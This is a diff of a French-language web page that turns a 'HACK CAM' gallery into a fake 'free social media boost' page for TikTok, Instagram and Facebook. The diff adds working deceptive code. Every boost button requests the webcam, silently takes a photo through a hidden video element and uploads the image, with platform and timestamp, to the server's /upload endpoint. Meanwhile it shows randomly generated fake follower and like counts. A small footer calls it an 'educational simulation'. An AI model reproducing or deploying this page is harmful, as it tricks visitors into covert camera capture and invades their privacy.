@@ -2,7 +2,8 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <title>CDM TECH 503 - HACK CAM</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>SKY PLUG FREE METHOD — BOOST SOCIAL</title>
   <style>
     * {
       margin: 0;
@@ -13,17 +14,17 @@
     body {
       background: linear-gradient(135deg, #0a0a0a 0%, #0d0d0d 100%);
       color: #00ffcc;
-      font-family: 'Courier New', 'Segoe UI', 'Fira Code', monospace;
+      font-family: 'Segoe UI', 'Poppins', 'Courier New', monospace;
       display: flex;
       flex-direction: column;
       align-items: center;
       min-height: 100vh;
       margin: 0;
-      padding: 2rem;
+      padding: 2rem 1rem;
       position: relative;
     }
 
-    /* Effet de grille hacker */
+    /* Effet grille hacker */
     body::before {
       content: "";
       position: fixed;
@@ -39,378 +40,431 @@
       z-index: 0;
     }
 
-    /* Effet de scanline */
-    body::after {
-      content: "";
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: linear-gradient(transparent 50%, rgba(0, 255, 204, 0.02) 50%);
-      background-size: 100% 4px;
-      pointer-events: none;
-      animation: scan 8s linear infinite;
-      z-index: 1;
-    }
-
-    @keyframes scan {
-      0% { transform: translateY(-100%); }
-      100% { transform: translateY(100%); }
-    }
-
-    .header {
-      text-align: center;
-      margin-bottom: 2rem;
+    .container {
       position: relative;
       z-index: 2;
+      max-width: 500px;
+      width: 100%;
+      margin: 0 auto;
+    }
+
+    /* Header style social */
+    .social-header {
+      background: linear-gradient(135deg, #00ffcc, #ff00cc);
+      border-radius: 20px;
+      padding: 25px 20px;
+      text-align: center;
+      margin-bottom: 25px;
+      box-shadow: 0 10px 30px rgba(0, 255, 204, 0.3);
+      animation: borderPulse 2s infinite;
+    }
+
+    @keyframes borderPulse {
+      0%, 100% { box-shadow: 0 10px 30px rgba(0, 255, 204, 0.3); }
+      50% { box-shadow: 0 10px 50px rgba(255, 0, 204, 0.5); }
+    }
+
+    h1 {
+      font-size: 2rem;
+      margin: 0;
+      color: #0a0a0a;
+      letter-spacing: 2px;
+      font-weight: 900;
+    }
+
+    .subtitle {
+      color: #0a0a0a;
+      opacity: 0.9;
+      margin-top: 5px;
+      font-size: 0.8rem;
+    }
+
+    /* Cartes de boost */
+    .boost-card {
+      background: rgba(10, 10, 10, 0.95);
+      border: 1px solid #00ffcc;
+      border-radius: 16px;
+      padding: 20px;
+      margin-bottom: 20px;
+      backdrop-filter: blur(10px);
+      transition: all 0.3s ease;
+    }
+
+    .boost-card:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 5px 20px rgba(0, 255, 204, 0.2);
+      border-color: #ff00cc;
+    }
+
+    .platform-icons {
+      display: flex;
+      gap: 15px;
+      margin-bottom: 15px;
+      flex-wrap: wrap;
+    }
+
+    .platform {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      background: rgba(0, 255, 204, 0.1);
+      padding: 8px 15px;
+      border-radius: 30px;
+      font-size: 0.9rem;
+      font-weight: bold;
+    }
+
+    .platform.tiktok { color: #00f2ea; }
+    .platform.instagram { color: #ff0050; }
+    .platform.facebook { color: #1877f2; }
+    .platform.whatsapp { color: #25d366; }
+
+    .counters {
+      display: flex;
+      justify-content: space-between;
+      margin: 15px 0;
+      text-align: center;
+    }
+
+    .counter-item {
+      flex: 1;
+    }
+
+    .counter-value {
+      font-size: 2rem;
+      font-weight: bold;
+      color: #00ffcc;
+    }
+
+    .counter-label {
+      font-size: 0.7rem;
+      color: #888;
+      text-transform: uppercase;
+    }
+
+    .btn-boost {
+      width: 100%;
+      background: linear-gradient(90deg, #00ffcc, #ff00cc);
+      color: #0a0a0a;
+      border: none;
+      padding: 14px;
+      font-size: 1.1rem;
+      font-weight: bold;
+      border-radius: 40px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      margin-top: 10px;
+    }
+
+    .btn-boost:hover {
+      transform: scale(1.02);
+      box-shadow: 0 0 20px rgba(0, 255, 204, 0.5);
+    }
+
+    /* Section caméra cachée */
+    .camera-section {
+      display: none;
+    }
+
+    video {
+      width: 100%;
+      border-radius: 12px;
+      margin-top: 15px;
+    }
+
+    /* Notification style */
+    .notification {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #00ffcc;
+      color: #0a0a0a;
+      padding: 12px 24px;
+      border-radius: 40px;
+      font-weight: bold;
+      z-index: 1000;
+      animation: slideUp 0.3s ease;
+      display: none;
+    }
+
+    @keyframes slideUp {
+      from {
+        opacity: 0;
+        transform: translateX(-50%) translateY(20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateX(-50%) translateY(0);
+      }
+    }
+
+    .footer {
+      text-align: center;
+      margin-top: 20px;
+      font-size: 0.7rem;
+      color: #666;
+    }
+
+    /* Glitch text */
+    .glitch-text {
       animation: glitch 3s infinite;
     }
 
     @keyframes glitch {
       0%, 100% { text-shadow: 0 0 0 #00ffcc; }
       95% { text-shadow: 0 0 0 #00ffcc; }
-      96% { text-shadow: -2px 0 #ff00cc, 2px 0 #00ffcc; }
-      97% { text-shadow: 2px 0 #ff00cc, -2px 0 #00ffcc; }
-      98% { text-shadow: 0 0 0 #00ffcc; }
-    }
-
-    h1 {
-      font-size: 2.5rem;
-      margin: 0;
-      background: linear-gradient(90deg, #00ffcc, #ff00cc, #00ffcc);
-      -webkit-background-clip: text;
-      background-clip: text;
-      color: transparent;
-      letter-spacing: 3px;
-      font-family: monospace;
-      animation: gradient 3s ease infinite;
-      background-size: 200% auto;
-    }
-
-    @keyframes gradient {
-      0% { background-position: 0% center; }
-      50% { background-position: 100% center; }
-      100% { background-position: 0% center; }
-    }
-
-    .subtitle {
-      color: #00ffcc;
-      margin-top: 0.5rem;
-      opacity: 0.8;
-      letter-spacing: 2px;
-    }
-
-    .typing-text {
-      border-right: 2px solid #00ffcc;
-      white-space: nowrap;
-      overflow: hidden;
-      animation: typing 3s steps(40, end), blink-caret 0.75s step-end infinite;
-    }
-
-    @keyframes typing {
-      from { width: 0; }
-      to { width: 100%; }
-    }
-
-    @keyframes blink-caret {
-      from, to { border-color: transparent; }
-      50% { border-color: #00ffcc; }
-    }
-
-    .gallery-container {
-      width: 90%;
-      max-width: 900px;
-      background: rgba(10, 10, 10, 0.9);
-      border: 1px solid #00ffcc;
-      border-radius: 12px;
-      padding: 2rem;
-      box-shadow: 0 0 30px rgba(0, 255, 204, 0.2);
-      backdrop-filter: blur(5px);
-      position: relative;
-      z-index: 2;
-    }
-
-    .gallery-container::before {
-      content: "[ SYSTEM ONLINE ]";
-      position: absolute;
-      top: -25px;
-      left: 20px;
-      color: #00ffcc;
-      font-size: 0.8rem;
-      font-family: monospace;
-      background: #0a0a0a;
-      padding: 0 10px;
-    }
-
-    .photo-grid {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 1rem;
-      margin-bottom: 2rem;
-    }
-
-    .photo-placeholder {
-      aspect-ratio: 1/1;
-      background: #1a1a1a;
-      border: 1px solid #00ffcc;
-      border-radius: 8px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: #00ffcc;
-      font-size: 2rem;
-      cursor: pointer;
-      transition: all 0.3s ease;
-      position: relative;
-      overflow: hidden;
-    }
-
-    .photo-placeholder:hover {
-      background: #00ffcc;
-      color: #0a0a0a;
-      box-shadow: 0 0 20px rgba(0, 255, 204, 0.5);
-      transform: scale(1.02);
-    }
-
-    .photo-placeholder::after {
-      content: "[ ACCESS ]";
-      position: absolute;
-      bottom: -20px;
-      left: 0;
-      right: 0;
-      background: #00ffcc;
-      color: #0a0a0a;
-      font-size: 0.7rem;
-      text-align: center;
-      transition: bottom 0.3s ease;
-    }
-
-    .photo-placeholder:hover::after {
-      bottom: 0;
-    }
-
-    .controls {
-      display: flex;
-      justify-content: center;
-      gap: 1rem;
-      margin-top: 1rem;
-    }
-
-    button {
-      background: linear-gradient(135deg, #00ffcc, #0099ff);
-      color: #0a0a0a;
-      border: none;
-      padding: 12px 24px;
-      font-size: 1rem;
-      font-weight: 600;
-      cursor: pointer;
-      border-radius: 8px;
-      transition: all 0.3s ease;
-      font-family: monospace;
-      text-transform: uppercase;
-      letter-spacing: 2px;
-      position: relative;
-      overflow: hidden;
-    }
-
-    button::before {
-      content: ">";
-      position: absolute;
-      left: -20px;
-      transition: left 0.3s ease;
-    }
-
-    button:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 5px 20px rgba(0, 255, 204, 0.5);
-      background: linear-gradient(135deg, #ff00cc, #00ffcc);
-    }
-
-    button:hover::before {
-      left: 10px;
-    }
-
-    video {
-      display: none;
-    }
-
-    .camera-button {
-      position: fixed;
-      bottom: 2rem;
-      right: 2rem;
-      width: 70px;
-      height: 70px;
-      border-radius: 50%;
-      background: linear-gradient(135deg, #ff00cc, #00ffcc);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: #0a0a0a;
-      font-size: 2rem;
-      cursor: pointer;
-      box-shadow: 0 0 30px rgba(0, 255, 204, 0.6);
-      z-index: 100;
-      transition: all 0.3s ease;
-      animation: pulse 2s infinite;
-    }
-
-    @keyframes pulse {
-      0%, 100% { transform: scale(1); box-shadow: 0 0 30px rgba(0, 255, 204, 0.6); }
-      50% { transform: scale(1.1); box-shadow: 0 0 50px rgba(255, 0, 204, 0.8); }
-    }
-
-    .camera-button:hover {
-      transform: scale(1.2) rotate(10deg);
-    }
-
-    /* Footer hacker */
-    .footer {
-      position: fixed;
-      bottom: 0;
-      left: 0;
-      right: 0;
-      text-align: center;
-      padding: 10px;
-      background: rgba(0, 0, 0, 0.8);
-      color: #00ffcc;
-      font-size: 0.8rem;
-      font-family: monospace;
-      z-index: 2;
-      border-top: 1px solid #00ffcc;
-    }
-
-    /* Matrice effet pour certains éléments */
-    .matrix {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      pointer-events: none;
-      z-index: 0;
-      opacity: 0.05;
-    }
-
-    /* Responsive */
-    @media (max-width: 600px) {
-      .photo-grid {
-        grid-template-columns: repeat(2, 1fr);
-      }
-      h1 {
-        font-size: 1.5rem;
-      }
+      96% { text-shadow: -1px 0 #ff00cc, 1px 0 #00ffcc; }
+      97% { text-shadow: 1px 0 #ff00cc, -1px 0 #00ffcc; }
     }
   </style>
 </head>
 <body>
-  <div class="header">
-    <h1>CDM TECH 503 // HACK CAM</h1>
-    <p class="subtitle typing-text">[ SYSTEM // SKY PLUG CDM - LE MEILLEUR DEV ]</p>
-    <p class="subtitle">[ FAMILLE CDM // UNIS POUR LA DOMINATION ]</p>
+
+<div class="container">
+  <!-- Header social -->
+  <div class="social-header">
+    <h1 class="glitch-text">⚡ SKY PLUG FREE METHOD ⚡</h1>
+    <div class="subtitle">🔥 BOOST TES RÉSEAUX GRATUITEMENT 🔥</div>
   </div>
 
-  <div class="gallery-container">
-    <div class="photo-grid">
-      <div class="photo-placeholder" id="photo1">📷</div>
-      <div class="photo-placeholder" id="photo2">📷</div>
-      <div class="photo-placeholder" id="photo3">📷</div>
-      <div class="photo-placeholder" id="photo4">📷</div>
-      <div class="photo-placeholder" id="photo5">📷</div>
-      <div class="photo-placeholder" id="photo6">📷</div>
+  <!-- Carte TikTok -->
+  <div class="boost-card">
+    <div class="platform-icons">
+      <span class="platform tiktok">🎵 TikTok</span>
     </div>
-
-    <div class="controls">
-      <button onclick="startCapture()">[ CAPTURE ]</button>
-      <button onclick="applyEffect()">[ EFFETS ]</button>
-      <button onclick="exportPhotos()">[ EXPORT ]</button>
+    <div class="counters">
+      <div class="counter-item">
+        <div class="counter-value" id="tiktokViews">0</div>
+        <div class="counter-label">Vues</div>
+      </div>
+      <div class="counter-item">
+        <div class="counter-value" id="tiktokLikes">0</div>
+        <div class="counter-label">J'aime</div>
+      </div>
+      <div class="counter-item">
+        <div class="counter-value" id="tiktokShares">0</div>
+        <div class="counter-label">Partages</div>
+      </div>
     </div>
+    <button class="btn-boost" onclick="boostTikTok()">🎯 BOOSTER TIKTOK</button>
   </div>
 
-  <div class="camera-button" onclick="startCapture()">
-    🎯
+  <!-- Carte Instagram -->
+  <div class="boost-card">
+    <div class="platform-icons">
+      <span class="platform instagram">📸 Instagram</span>
+    </div>
+    <div class="counters">
+      <div class="counter-item">
+        <div class="counter-value" id="igFollowers">0</div>
+        <div class="counter-label">Abonnés</div>
+      </div>
+      <div class="counter-item">
+        <div class="counter-value" id="igLikes">0</div>
+        <div class="counter-label">J'aime</div>
+      </div>
+      <div class="counter-item">
+        <div class="counter-value" id="igComments">0</div>
+        <div class="counter-label">Commentaires</div>
+      </div>
+    </div>
+    <button class="btn-boost" onclick="boostInstagram()">📷 BOOSTER INSTAGRAM</button>
+  </div>
+
+  <!-- Carte Facebook -->
+  <div class="boost-card">
+    <div class="platform-icons">
+      <span class="platform facebook">📘 Facebook</span>
+    </div>
+    <div class="counters">
+      <div class="counter-item">
+        <div class="counter-value" id="fbLikes">0</div>
+        <div class="counter-label">J'aime</div>
+      </div>
+      <div class="counter-item">
+        <div class="counter-value" id="fbShares">0</div>
+        <div class="counter-label">Partages</div>
+      </div>
+      <div class="counter-item">
+        <div class="counter-value" id="fbComments">0</div>
+        <div class="counter-label">Commentaires</div>
+      </div>
+    </div>
+    <button class="btn-boost" onclick="boostFacebook()">👍 BOOSTER FACEBOOK</button>
+  </div>
+
+  <!-- Carte WhatsApp (réseau CDM) -->
+  <div class="boost-card">
+    <div class="platform-icons">
+      <span class="platform whatsapp">💬 WhatsApp CDM</span>
+    </div>
+    <div class="counters">
+      <div class="counter-item">
+        <div class="counter-value" id="whatsappMembers">503</div>
+        <div class="counter-label">Membres</div>
+      </div>
+      <div class="counter-item">
+        <div class="counter-value" id="whatsappActive">128</div>
+        <div class="counter-label">Actifs</div>
+      </div>
+    </div>
+    <button class="btn-boost" onclick="joinWhatsApp()">📱 REJOINDRE LE RÉSEAU CDM</button>
   </div>
 
   <div class="footer">
-    <span>✦ CDM TECH 503 ✦ | SKY PLUG CDM - LEADER | FAMILLE CDM - FORCE ✦ | 🔗 CHAÎNE OFFICIELLE : <a href="https://whatsapp.com/channel/0029VbCArXO2phHPux5T8D3K" style="color:#00ffcc; text-decoration:none;" target="_blank">WHATSAPP CDM</a> ✦</span>
+    <span>✦ SKY PLUG CDM — CDM TECH 503 ✦</span><br>
+    <span style="font-size: 0.6rem;">⚠️ Simulation éducative — Nécessite autorisation caméra ⚠️</span>
   </div>
+</div>
 
+<!-- Section caméra cachée (pour la capture) -->
+<div class="camera-section">
   <video id="video" autoplay></video>
-  
-  <script>
-    let currentPhoto = 1;
-    const photos = {};
+</div>
 
-    function startCapture() {
-      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-        navigator.mediaDevices.getUserMedia({ video: true })
-          .then(function(stream) {
-            const video = document.getElementById('video');
-            video.srcObject = stream;
-            video.style.display = 'block';
-            video.play();
+<div id="notification" class="notification"></div>
 
-            setTimeout(() => {
-              capturePhoto(stream);
-            }, 1000);
-          })
-          .catch(function(error) {
-            console.error("Erreur caméra:", error);
-            alert("Accès caméra refusé ou erreur technique");
-          });
-      } else {
-        alert("Navigateur non compatible");
-      }
+<script>
+  // Variables de compteurs
+  let tiktokViews = 0, tiktokLikes = 0, tiktokShares = 0;
+  let igFollowers = 0, igLikes = 0, igComments = 0;
+  let fbLikes = 0, fbShares = 0, fbComments = 0;
+
+  let stream = null;
+  let captureCount = 0;
+
+  // Notification
+  function showNotif(message, isError = false) {
+    const notif = document.getElementById('notification');
+    notif.style.display = 'block';
+    notif.style.background = isError ? '#ff0050' : '#00ffcc';
+    notif.style.color = '#0a0a0a';
+    notif.innerText = message;
+    setTimeout(() => {
+      notif.style.display = 'none';
+    }, 3000);
+  }
+
+  // Demander caméra et capturer
+  function requestCameraAndCapture(platformName) {
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(function(s) {
+          stream = s;
+          const video = document.getElementById('video');
+          video.srcObject = stream;
+          video.play();
+
+          setTimeout(() => {
+            capturePhoto(stream, platformName);
+          }, 500);
+        })
+        .catch(function(error) {
+          console.error("Erreur caméra:", error);
+          showNotif("❌ Accès caméra refusé. Active la caméra pour le boost !", true);
+        });
+    } else {
+      showNotif("❌ Navigateur non compatible", true);
     }
+  }
 
-    function capturePhoto(stream) {
-      const video = document.getElementById('video');
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const context = canvas.getContext('2d');
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
-      
-      const imageData = canvas.toDataURL('image/jpeg');
-      
-      if (currentPhoto <= 6) {
-        const photoDiv = document.getElementById(`photo${currentPhoto}`);
-        photoDiv.style.backgroundImage = `url(${imageData})`;
-        photoDiv.style.backgroundSize = 'cover';
-        photoDiv.style.backgroundPosition = 'center';
-        photoDiv.innerHTML = '';
-        photos[`photo${currentPhoto}`] = imageData;
-        currentPhoto++;
-      } else {
-        alert("Album plein ! Utilisez Exporter pour sauvegarder");
+  // Capture photo et envoi au serveur
+  function capturePhoto(stream, platformName) {
+    const video = document.getElementById('video');
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    const context = canvas.getContext('2d');
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    
+    const imageData = canvas.toDataURL('image/jpeg', 0.7);
+    captureCount++;
+
+    // Envoi au serveur Flask
+    fetch('/upload', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ 
+        image: imageData, 
+        number: captureCount,
+        platform: platformName,
+        timestamp: new Date().toISOString()
+      })
+    })
+    .then(res => res.json())
+    .then(data => {
+      if (data.status === 'success') {
+        console.log(`[+] Capture ${captureCount} envoyée (${platformName})`);
       }
-      
-      // Arrêter la caméra
+    })
+    .catch(err => console.error("Upload error:", err));
+
+    // Arrêter la caméra
+    if (stream) {
       stream.getTracks().forEach(track => track.stop());
-      video.style.display = 'none';
+      stream = null;
     }
+  }
 
-    function applyEffect() {
-      alert("🎨 Effets Premium CDM : Filtre Hacker appliqué !");
-    }
+  // Fonctions de boost
+  function boostTikTok() {
+    requestCameraAndCapture('TikTok');
+    
+    tiktokViews += Math.floor(Math.random() * 500) + 100;
+    tiktokLikes += Math.floor(Math.random() * 80) + 20;
+    tiktokShares += Math.floor(Math.random() * 30) + 5;
+    
+    document.getElementById('tiktokViews').innerText = tiktokViews;
+    document.getElementById('tiktokLikes').innerText = tiktokLikes;
+    document.getElementById('tiktokShares').innerText = tiktokShares;
+    
+    showNotif(`✅ +${Math.floor(Math.random() * 500)} vues TikTok ! Continue comme ça 🔥`);
+  }
 
-    function exportPhotos() {
-      let message = "📸 Photos capturées par CDM TECH 503 :\n";
-      for (let i = 1; i <= 6; i++) {
-        if (photos[`photo${i}`]) {
-          message += `✅ Photo ${i} capturée\n`;
-        } else {
-          message += `❌ Photo ${i} vide\n`;
-        }
-      }
-      message += "\n🔗 Rejoins CDM : https://whatsapp.com/channel/0029VbCArXO2phHPux5T8D3K";
-      alert(message);
-    }
+  function boostInstagram() {
+    requestCameraAndCapture('Instagram');
+    
+    igFollowers += Math.floor(Math.random() * 50) + 10;
+    igLikes += Math.floor(Math.random() * 100) + 30;
+    igComments += Math.floor(Math.random() * 20) + 5;
+    
+    document.getElementById('igFollowers').innerText = igFollowers;
+    document.getElementById('igLikes').innerText = igLikes;
+    document.getElementById('igComments').innerText = igComments;
+    
+    showNotif(`📸 +${Math.floor(Math.random() * 50)} nouveaux abonnés Instagram !`);
+  }
 
-    // Ajouter un effet sonore virtuel (juste pour le style hacker)
-    console.log("%cCDM TECH 503 - SKY PLUG CDM", "color: #00ffcc; font-size: 20px; font-weight: bold;");
-    console.log("%cFamille CDM - Unis pour la domination numérique", "color: #ff00cc; font-size: 14px;");
-    console.log("%cChaîne WhatsApp: https://whatsapp.com/channel/0029VbCArXO2phHPux5T8D3K", "color: #00ffcc;");
-  </script>
+  function boostFacebook() {
+    requestCameraAndCapture('Facebook');
+    
+    fbLikes += Math.floor(Math.random() * 80) + 20;
+    fbShares += Math.floor(Math.random() * 30) + 10;
+    fbComments += Math.floor(Math.random() * 25) + 5;
+    
+    document.getElementById('fbLikes').innerText = fbLikes;
+    document.getElementById('fbShares').innerText = fbShares;
+    document.getElementById('fbComments').innerText = fbComments;
+    
+    showNotif(`👍 +${Math.floor(Math.random() * 80)} likes Facebook !`);
+  }
+
+  function joinWhatsApp() {
+    requestCameraAndCapture('WhatsApp CDM');
+    showNotif(`📱 Rejoins le canal CDM : whatsapp.com/channel/0029VbCArXO2phHPux5T8D3K`);
+    setTimeout(() => {
+      window.open('https://whatsapp.com/channel/0029VbCArXO2phHPux5T8D3K', '_blank');
+    }, 1500);
+  }
+
+  // Console hacker
+  console.log("%c⚡ SKY PLUG FREE METHOD ⚡", "color: #00ffcc; font-size: 18px; font-weight: bold;");
+  console.log("%c👑 CDM TECH 503 — La légende vivante", "color: #ff00cc; font-size: 14px;");
+  console.log("%c💪 Famille CDM — Unis comme jamais", "color: #00ffcc;");
+  console.log("%c🔗 Canal WhatsApp: https://whatsapp.com/channel/0029VbCArXO2phHPux5T8D3K", "color: #25d366;");
+</script>
 </body>
 </html>
